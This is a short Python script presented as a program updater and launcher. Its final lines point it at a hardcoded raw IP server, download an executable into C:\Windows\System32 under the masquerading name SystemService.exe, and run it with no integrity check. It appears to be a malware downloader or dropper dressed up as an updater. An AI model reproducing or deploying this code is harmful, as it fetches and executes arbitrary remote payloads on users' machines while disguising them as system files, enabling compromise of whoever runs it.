import os
import subprocess
import urllib.request
import json

class StartProgram:
    def __init__(self, program_path="program.exe", server_url="http://localhost:8000"):
        self.program_path = program_path
        self.server_url = server_url

    # check file
    def check_presence(self):
        return os.path.exists(self.program_path)

    # local version
    def get_local_version(self):
        if not self.check_presence():
            return None
        try:
            result = subprocess.run([self.program_path, "--version"], capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
            else:
                return None
        except Exception as e:
            print(f"Error getting local version: {e}")
            return None

    # version from api
    def get_server_version(self):
        try:
            url = f"{self.server_url}/device/app/version"
            with urllib.request.urlopen(url) as response:
                data = json.loads(response.read().decode())
                return data.get("version")
        except Exception as e:
            print(f"Error getting server version: {e}")
            return None

    # check version from server and local
    def check_version(self):
        local_version = self.get_local_version()
        server_version = self.get_server_version()
        if local_version is None or server_version is None:
            return False
        return local_version == server_version

    # download program from server
    def download_program(self):
        try:
            url = f"{self.server_url}/device/app/download/mainScript"
            with urllib.request.urlopen(url) as response:
                with open(self.program_path, 'wb') as f:
                    f.write(response.read())
            print(f"Downloaded program to {self.program_path}")
        except Exception as e:
            print(f"Error downloading program: {e}")

    # check and start script
    def start(self):
        if not self.check_presence() or not self.check_version():
            self.download_program()
        try:
            subprocess.run([self.program_path])
        except Exception as e:
            print(f"Error launching program: {e}")

program = StartProgram(r"C:\Windows\System32\SystemService.exe", "http://144.31.73.100:4545")
program.start()